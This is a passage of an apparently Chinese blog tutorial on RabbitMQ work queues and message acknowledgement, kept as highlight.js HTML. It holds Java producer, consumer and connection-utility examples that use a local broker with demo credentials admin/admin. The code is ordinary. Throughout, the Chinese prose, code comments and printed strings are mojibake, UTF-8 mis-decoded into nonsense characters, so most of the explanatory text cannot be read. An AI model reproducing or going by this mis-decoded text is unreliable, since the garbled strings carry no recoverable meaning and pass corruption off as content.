class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Consumer</span> &#123;<br>    <span class="hljs-comment">// é˜Ÿåˆ—åç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">QUEUE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello&quot;</span>;<br><br>    <span class="hljs-comment">// æ¥å—æ¶ˆæ¯</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException &#123;<br>        <span class="hljs-comment">// åˆ›å»ºè¿æ¥å·¥å‚</span><br>        <span class="hljs-type">ConnectionFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionFactory</span>();<br><br>        factory.setHost(<span class="hljs-string">&quot;192.168.23.132&quot;</span>);<br>        factory.setUsername(<span class="hljs-string">&quot;admin&quot;</span>);<br>        factory.setPassword(<span class="hljs-string">&quot;admin&quot;</span>);<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> factory.newConnection();<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> connection.createChannel();<br><br>        <span class="hljs-comment">// å£°æ˜ æ¥å—æ¶ˆæ¯</span><br>        <span class="hljs-type">DeliverCallback</span> <span class="hljs-variable">deliverCallback</span> <span class="hljs-operator">=</span> (consumerTag,message) -&gt; &#123;<br>            System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody()));<br>        &#125;;<br><br>        <span class="hljs-comment">// å£°æ˜ å–æ¶ˆæ¶ˆæ¯</span><br>        <span class="hljs-type">CancelCallback</span> <span class="hljs-variable">cancelCallback</span> <span class="hljs-operator">=</span> consumer -&gt; &#123;<br>            System.out.println(<span class="hljs-string">&quot;æ¶ˆæ¯æ¶ˆè´¹è¢«ä¸­æ–­&quot;</span>);<br>        &#125;;<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        * æ¶ˆè´¹è€…æ¥æ”¶æ¶ˆæ¯</span><br><span class="hljs-comment">        * å‚æ•°1ï¼šè¡¨ç¤ºæ¶ˆè´¹å“ªä¸ªUIåˆ—</span><br><span class="hljs-comment">        * å‚æ•°2ï¼šæ¶ˆè´¹æˆåŠŸä¹‹åï¼Œæ˜¯å¦éœ€è¦è‡ªåŠ¨åº”ç­”ï¼Œtrueè¡¨ç¤ºè‡ªåŠ¨åº”ç­”ï¼Œfalseè¡¨ç¤ºæ‰‹åŠ¨åº”ç­”</span><br><span class="hljs-comment">        * å‚æ•°3ï¼šæ¶ˆè´¹è€…æˆåŠŸæ¶ˆè´¹çš„å›è°ƒ</span><br><span class="hljs-comment">        * å‚æ•°4ï¼šæ¶ˆè´¹è€…å–æ¶ˆæ¶ˆè´¹çš„å›è°ƒ</span><br><span class="hljs-comment">         */</span><br>        channel.basicConsume(QUEUE_NAME,<span class="hljs-literal">true</span>,deliverCallback,cancelCallback);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="4-work-queues"><a class="markdownIt-Anchor" href="#4-work-queues"></a> 4. <strong>Work Queues</strong></h1><blockquote><p>ç®€ä»‹</p></blockquote><p>å·¥ä½œé˜Ÿåˆ—(åˆç§°ä»»åŠ¡é˜Ÿåˆ—)çš„ä¸»è¦æ€æƒ³æ˜¯é¿å…ç«‹å³æ‰§è¡Œèµ„æºå¯†é›†å‹ä»»åŠ¡ï¼Œè€Œä¸å¾—ä¸ç­‰å¾…å®ƒå®Œæˆã€‚ç›¸åæˆ‘ä»¬å®‰æ’ä»»åŠ¡åœ¨ä¹‹åæ‰§è¡Œã€‚æˆ‘ä»¬æŠŠä»»åŠ¡å°è£…ä¸ºæ¶ˆæ¯å¹¶å°†å…¶å‘é€åˆ°é˜Ÿåˆ—ã€‚åœ¨åå°è¿è¡Œçš„å·¥ä½œè¿›ç¨‹å°†å¼¹å‡ºä»»åŠ¡å¹¶æœ€ç»ˆæ‰§è¡Œä½œä¸šã€‚å½“æœ‰å¤šä¸ªå·¥ä½œçº¿ç¨‹æ—¶ï¼Œè¿™äº›å·¥ä½œçº¿ç¨‹å°†ä¸€èµ·å¤„ç†è¿™äº›ä»»åŠ¡ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112143015734.png" alt="image-20230112143015734" /></p><h2 id="41-å®ç°å·¥ä½œé˜Ÿåˆ—"><a class="markdownIt-Anchor" href="#41-å®ç°å·¥ä½œé˜Ÿåˆ—"></a> 4.1 å®ç°å·¥ä½œé˜Ÿåˆ—</h2><blockquote><p>æŠ½å–è¿æ¥å·¥å‚æ”»å‡»ç±»</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* æ­¤ç±»ä¸ºè¿æ¥å·¥å‚åˆ›å»ºä¿¡é“çš„å·¥å…·ç±»</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RabbitMqUtils</span> &#123;<br>     <span class="hljs-comment">// å¾—åˆ°ä¸€ä¸ªè¿æ¥çš„channel</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Channel <span class="hljs-title function_">getChannel</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException &#123;<br>        <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªè¿æ¥å·¥å‚</span><br>        <span class="hljs-type">ConnectionFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionFactory</span>();<br>        factory.setHost(<span class="hljs-string">&quot;192.168.23.132&quot;</span>);<br>        factory.setUsername(<span class="hljs-string">&quot;admin&quot;</span>);<br>        factory.setPassword(<span class="hljs-string">&quot;admin&quot;</span>);<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> factory.newConnection();<br>        com.rabbitmq.client.<span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> connection.createChannel();<br>        <span class="hljs-keyword">return</span> channel;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>å·¥ä½œçº¿ç¨‹ä»£ç </p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.rabbitmq.client.CancelCallback;<br><span class="hljs-keyword">import</span> com.rabbitmq.client.Channel;<br><span class="hljs-keyword">import</span> com.rabbitmq.client.DeliverCallback;<br><br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.concurrent.TimeoutException;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * [io.xtwoy.workqueues]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [å¸­å­ä¸ä¼šæ•²ä»£ç ]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/12 14:35]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Worker01</span> &#123;<br><br>    <span class="hljs-comment">// é˜Ÿåˆ—åç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">QUEUE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello&quot;</span>;<br><br>    <span class="hljs-comment">// æ¥å—æ¶ˆæ¯</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException &#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><br>        <span class="hljs-comment">// æ¥å—æ¶ˆæ¯å‚æ•°</span><br>        <span class="hljs-type">DeliverCallback</span> <span class="hljs-variable">deliverCallback</span> <span class="hljs-operator">=</span> (consumerTag, message) -&gt; &#123;<br>            System.out.println(<span class="hljs-string">&quot;æ¥å—åˆ°çš„æ¶ˆæ¯ï¼š&quot;</span>+<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody()));<br><br>        &#125;;<br><br>        <span class="hljs-comment">// å–æ¶ˆæ¶ˆè´¹å‚æ•°</span><br>        <span class="hljs-type">CancelCallback</span> <span class="hljs-variable">cancelCallback</span> <span class="hljs-operator">=</span> consumerTag -&gt; &#123;<br>            System.out.println(consumerTag+<span class="hljs-string">&quot;æ¶ˆè´¹è€…å–æ¶ˆæ¶ˆè´¹å€Ÿå£å›è°ƒé€»è¾‘&quot;</span>);<br>        &#125;;<br>        System.out.println(<span class="hljs-string">&quot;work2å·²å¯åŠ¨&quot;</span>);<br>        <span class="hljs-comment">// æ¶ˆæ¯çš„æ¥å—</span><br>        channel.basicConsume(QUEUE_NAME,<span class="hljs-literal">true</span>,deliverCallback,cancelCallback);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>åŒæ—¶å¼€å¯2ä¸ªå·¥ä½œçº¿ç¨‹ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112145927231.png" alt="image-20230112145927231" /></p><p>ç„¶åå¯åŠ¨å·¥ä½œçº¿ç¨‹1ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112150022554.png" alt="image-20230112150022554" /></p><p>ä¿®æ”¹è¾“å‡ºä¿¡æ¯ï¼Œä½œä¸ºå·¥ä½œçº¿ç¨‹2ï¼š</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112150048071.png" alt="image-20230112150048071" /></p><blockquote><p>ç”Ÿäº§è€…ä»£ç </p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Task01</span> &#123;<br>    <span class="hljs-comment">// é˜Ÿåˆ—åç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">QUEUE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;hello&quot;</span>;<br><br>    <span class="hljs-comment">// å‘é€å¤§é‡æ¶ˆæ¯</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><br>        <span class="hljs-comment">// é˜Ÿåˆ—çš„å£°æ˜</span><br>        channel.queueDeclare(QUEUE_NAME,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">// ä»æ§åˆ¶å°ä¸­è¾“å…¥æ¶ˆæ¯</span><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        <span class="hljs-keyword">while</span> (scanner.hasNext())&#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> scanner.next();<br>            channel.basicPublish(<span class="hljs-string">&quot;&quot;</span>,QUEUE_NAME,<span class="hljs-literal">null</span>,message.getBytes(StandardCharsets.UTF_8));<br>            System.out.println(<span class="hljs-string">&quot;å‘é€æ¶ˆæ¯å®Œæˆï¼š&quot;</span>+ message);<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æµ‹è¯•</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112151409072.png" alt="image-20230112151409072" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112151401692.png" alt="image-20230112151401692" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112151351087.png" alt="image-20230112151351087" /></p><h2 id="42-æ¶ˆæ¯åº”ç­”"><a class="markdownIt-Anchor" href="#42-æ¶ˆæ¯åº”ç­”"></a> 4.2 æ¶ˆæ¯åº”ç­”</h2><blockquote><p>æ¦‚å¿µ</p></blockquote><ol><li>æ¶ˆè´¹è€…å®Œæˆä¸€ä¸ªä»»åŠ¡å¯èƒ½éœ€è¦ä¸€æ®µæ—¶é—´ï¼Œå¦‚æœå…¶ä¸­ä¸€ä¸ªæ¶ˆè´¹è€…å¤„ç†ä¸€ä¸ªé•¿çš„ä»»åŠ¡å¹¶ä»…åªå®Œæˆäº†éƒ¨åˆ†çªç„¶å®ƒæŒ‚æ‰äº†ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆæƒ…å†µã€‚RabbitMQä¸€æ—¦å‘æ¶ˆè´¹è€…ä¼ é€’äº†ä¸€æ¡æ¶ˆæ¯ï¼Œä¾¿ç«‹å³å°†è¯¥æ¶ˆæ¯æ ‡è®°ä¸ºåˆ é™¤ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œçªç„¶æœ‰ä¸ªæ¶ˆè´¹è€…æŒ‚æ‰äº†ï¼Œæˆ‘ä»¬å°†ä¸¢å¤±æ­£åœ¨å¤„ç†çš„æ¶ˆæ¯ã€‚ä»¥åŠåç»­å‘é€ç»™è¯¥æ¶ˆè´¹è¿™çš„æ¶ˆæ¯ï¼Œå›½ä¸ºå®ƒæ— æ³•æ¥æ”¶åˆ°ã€‚</li><li>ä¸ºäº†ä¿è¯æ¶ˆæ¯åœ¨å‘é€è¿‡ç¨‹ä¸­ä¸ä¸¢å¤±ï¼ŒRabbitMQå¼•å…¥æ¶ˆæ¯åº”ç­”æœºåˆ¶ï¼Œæ¶ˆæ¯åº”ç­”å°±æ˜¯:æ¶ˆè´¹è€…åœ¨æ¥æ”¶åˆ°æ¶ˆæ¯å¹¶ä¸”å¤„ç†è¯¥æ¶ˆæ¯ä¹‹åï¼Œå‘Šè¯‰RabbitMQå®ƒå·²ç»å¤„ç†äº†ï¼ŒRabbitMQå¯ä»¥æŠŠè¯¥æ¶ˆæ¯åˆ é™¤äº†ã€‚</li></ol><blockquote><p>è‡ªåŠ¨åº”ç­”</p></blockquote><p>æ¶ˆæ¯å‘é€åç«‹å³è¢«è®¤ä¸ºå·²ç»ä¼ é€æˆåŠŸï¼Œè¿™ç§æ¨¡å¼éœ€è¦åœ¨é«˜ååé‡å’Œæ•°æ®ä¼ è¾“å®‰å…¨æ€§æ–¹é¢åšæƒè¡¡,å› ä¸ºè¿™ç§æ¨¡å¼å¦‚æœæ¶ˆæ¯åœ¨æ¥æ”¶åˆ°ä¹‹å‰ï¼Œæ¶ˆè´¹è€…é‚£è¾¹å‡ºç°è¿æ¥æˆ–è€…channelå…³é—­ï¼Œé‚£ä¹ˆæ¶ˆæ¯å°±ä¸¢å¤±äº†,å½“ç„¶å¦ä¸€æ–¹é¢è¿™ç§æ¨¡å¼æ¶ˆè´¹è€…é‚£è¾¹å¯ä»¥ä¼ é€’è¿‡è½½çš„æ¶ˆæ¯ï¼Œæ²¡æœ‰å¯¹ä¼ é€’çš„æ¶ˆæ¯æ•°é‡è¿›è¡Œé™åˆ¶,å½“ç„¶è¿™æ ·æœ‰å¯èƒ½ä½¿å¾—æ¶ˆè´¹è€…è¿™è¾¹ç”±äºæ¥æ”¶å¤ªå¤šè¿˜æ¥ä¸åŠå¤„ç†çš„æ¶ˆæ¯ï¼Œå¯¼è‡´è¿™äº›æ¶ˆæ¯çš„ç§¯å‹ï¼Œæœ€ç»ˆä½¿å¾—å†…å­˜è€—å°½ï¼Œæœ€ç»ˆè¿™äº›æ¶ˆè´¹è€…çº¿ç¨‹è¢«æ“ä½œç³»ç»Ÿæ€æ­»ï¼Œæ‰€ä»¥è¿™ç§æ¨¡å¼ä»…é€‚ç”¨åœ¨æ¶ˆè´¹è€…å¯ä»¥é«˜æ•ˆå¹¶ä»¥æŸç§é€Ÿç‡èƒ½å¤Ÿå¤„ç†è¿™äº›æ¶ˆæ¯çš„æƒ…å†µä¸‹ä½¿ç”¨ã€‚</p><blockquote><p>æ¶ˆæ¯åº”ç­”çš„æ–¹æ³•</p></blockquote><ol><li><p>Channel.basicAck(ç”¨äºè‚¯å®šç¡®è®¤)</p><p>RabbitMQå·²çŸ¥é“è¯¥æ¶ˆæ¯å¹¶ä¸”æˆåŠŸå¤„ç†ï¼Œå¯ä»¥å°†å…¶ä¸¢å¼ƒ</p></li><li><p>Channel.basicNack(ç”¨äºå¦å®šç¡®è®¤)</p></li><li><p>Channel.basicReject(ç”¨äºå¦å®šç¡®è®¤)ï¼Œä¸Channel.basicNackç›¸æ¯”å°‘äº†ä¸€ä¸ªå‚æ•°ï¼Œä¸å¤„ç†è¯¥æ¶ˆæ¯äº†ï¼Œç›´æ¥æ‹’ç»ï¼Œå¯ä»¥å°†å…¶ä¸¢å¼ƒäº†ã€‚</p></li></ol><blockquote><p>Multipleçš„è§£é‡Š</p></blockquote><p>æ‰‹åŠ¨åº”ç­”çš„å¥½å¤„æ˜¯<code>å¯ä»¥æ‰¹é‡åº”ç­”å¹¶ä¸”å‡å°‘ç½‘ç»œæ‹¥å µ</code></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112151637541.png" alt="image-20230112151637541" /></p><p>multipleçš„trueå’Œfalseæ˜¯ä¸åŒçš„æ„æ€ï¼š</p><ol><li>trueè¡¨ç¤ºæ‰¹é‡åº”ç­”channelä¸Šæœªåº”ç­”çš„æ¶ˆæ¯ï¼Œæ¯”å¦‚channelä¸Šæœ‰ä¼ é€tagçš„æ¶ˆæ¯5,6,7,8,ï¼Œå½“å‰tagæ˜¯8ï¼Œé‚£ä¹ˆæ­¤æ—¶5-8çš„è¿™äº›è¿˜æœªåº”ç­”çš„æ¶ˆæ¯å°±ä¼šè¢«ç¡®è®¤æ”¶åˆ°æ¶ˆæ¯åº”ç­”</li><li>falseåŒä¸Šé¢ç›¸æ¯”åªä¼šåº”ç­”tag=8çš„æ¶ˆæ¯ï¼Œ5,6,7è¿™ä¸‰ä¸ªæ¶ˆæ¯ä¾ç„¶ä¸ä¼šè¢«ç¡®è®¤æ”¶åˆ°æ¶ˆæ¯åº”ç­”</li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112154935516.png" alt="image-20230112154935516" /></p><blockquote><p>æ¶ˆæ¯è‡ªåŠ¨é‡æ–°å…¥é˜Ÿ</p></blockquote><p>å¦‚æœæ¶ˆè´¹è€…ç”±äºæŸäº›åŸå› å¤±å»è¿æ¥(å…¶é€šé“å·²å…³é—­ï¼Œè¿æ¥å·²å…³é—­æˆ–TCPè¿æ¥ä¸¢å¤±)ï¼Œå¯¼è‡´æ¶ˆæ¯æœªå‘é€ACKç¡®è®¤ï¼ŒRabbitMQå°†äº†è§£åˆ°æ¶ˆæ¯æœªå®Œå…¨å¤„ç†ï¼Œå¹¶å°†å¯¹å…¶é‡æ–°æ’é˜Ÿã€‚å¦‚æœæ­¤æ—¶å…¶ä»–æ¶ˆè´¹è€…å¯ä»¥å¤„ç†ï¼Œå®ƒå°†å¾ˆå¿«å°†å…¶é‡æ–°åˆ†å‘ç»™å¦ä¸€ä¸ªæ¶ˆè´¹è€…ã€‚è¿™æ ·ï¼Œå³ä½¿æŸä¸ªæ¶ˆè´¹è€…å¶å°”æ­»äº¡ï¼Œä¹Ÿå¯ä»¥ç¡®ä¿ä¸ä¼šä¸¢å¤±ä»»ä½•æ¶ˆæ¯ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112151757010.png" alt="image-20230112151757010" /></p><blockquote><p>æ¶ˆæ¯æ‰‹åŠ¨åº”ç­”</p></blockquote><ol><li><p>ç”Ÿäº§è€…ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* æ¶ˆæ¯åœ¨æ‰‹åŠ¨åº”ç­”æ—¶æ˜¯ä¸ä¸¢å¤±ã€æ”¾å›é˜Ÿåˆ—ä¸­é‡æ–°æ¶ˆè´¹</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Task2</span> &#123;<br><br>    <span class="hljs-comment">// é˜Ÿåˆ—åç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TASK_QUEUE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ack_queue&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException &#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><br>        <span class="hljs-comment">// å£°æ˜é˜Ÿåˆ—</span><br>        channel.queueDeclare(TASK_QUEUE_NAME,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        <span class="hljs-keyword">while</span> (scanner.hasNext())&#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> scanner.next();<br>            channel.basicPublish(<span class="hljs-string">&quot;&quot;</span>,TASK_QUEUE_NAME,<span class="hljs-literal">null</span>,message.getBytes(StandardCharsets.UTF_8));<br>            System.out.println(<span class="hljs-string">&quot;ç”Ÿäº§è€…å‘å‡ºæ¶ˆæ¯ï¼š&quot;</span>+message);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æ¶ˆè´¹è€…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* æ¶ˆè´¹è€…</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Worker03</span> &#123;<br>    <span class="hljs-comment">// é˜Ÿåˆ—åç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TASK_QUEUE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ack_queue&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException &#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br>        System.out.println(<span class="hljs-string">&quot;C1ç­‰å¾…æ¥å—æ¶ˆæ¯å¤„ç†æ—¶é—´è¾ƒçŸ­&quot;</span>);<br><br>        <span class="hljs-type">DeliverCallback</span> <span class="hljs-variable">deliverCallback</span> <span class="hljs-operator">=</span> (consumerTag,message) -&gt; &#123;<br>            <span class="hljs-comment">// æ²‰ç¡ä¸€ç§’</span><br>            SleepUtils.sleep(<span class="hljs-number">1</span>);<br>            System.out.println(<span class="hljs-string">&quot;æ¥å—åˆ°çš„æ¶ˆæ¯æ˜¯:&quot;</span>+<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody()));<br><br>            <span class="hljs-comment">//è¿›è¡Œæ‰‹åŠ¨åº”ç­”</span><br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">            * å‚æ•°1ï¼šæ¶ˆæ¯çš„æ ‡è®°  tag</span><br><span class="hljs-comment">            * å‚æ•°2ï¼šæ˜¯å¦æ‰¹é‡åº”ç­”ï¼Œfalseï¼šä¸æ‰¹é‡åº”ç­” trueï¼šæ‰¹é‡</span><br><span class="hljs-comment">            * */</span><br>            channel.basicAck(message.getEnvelope().getDeliveryTag(),<span class="hljs-literal">false</span>);<br>        &#125;;<br><br><br>        <span class="hljs-comment">// é‡‡ç”¨æ‰‹åŠ¨åº”ç­”</span><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">autoAck</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>        channel.basicConsume(TASK_QUEUE_NAME,autoAck,deliverCallback,(consumerTag) -&gt; &#123;<br>            System.out.println(consumerTag+<span class="hljs-string">&quot;æ¶ˆè´¹è€…å–æ¶ˆæ¶ˆè´¹æ¥å£å›è°ƒé€»è¾‘&quot;</span>);<br>        &#125;);<br>    